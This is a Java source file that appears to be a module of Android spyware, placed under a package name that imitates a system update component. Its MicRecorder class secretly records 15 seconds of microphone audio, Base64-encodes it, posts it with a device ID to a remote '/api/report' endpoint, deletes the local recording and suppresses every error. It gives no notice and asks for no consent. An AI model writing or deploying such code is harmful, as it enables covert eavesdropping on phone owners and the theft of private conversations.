package com.android.system.update;

import android.content.Context;
import android.media.MediaRecorder;
import android.util.Base64;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;

public class MicRecorder {
    private static MediaRecorder recorder;

    public static void record(Context ctx, String deviceId, String baseUrl) {
        try {
            File audioFile = new File(ctx.getExternalFilesDir(null), "rec.3gp");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                try {
                    recorder.stop();
                    recorder.release();
                    recorder = null;
                    
                    FileInputStream fis = new FileInputStream(audioFile);
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    byte[] buf = new byte[1024];
                    int len;
                    while ((len = fis.read(buf)) != -1) bos.write(buf, 0, len);
                    fis.close();
                    
                    String b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
                    JSONObject o = new JSONObject();
                    o.put("id", deviceId);
                    o.put("kind", "audio_rec");
                    o.put("body", b64);
                    Net.post(baseUrl + "/api/report", o.toString());
                    audioFile.delete();
                } catch (Exception ignored) {}
            }, 15000);
        } catch (Exception ignored) {}
    }
}
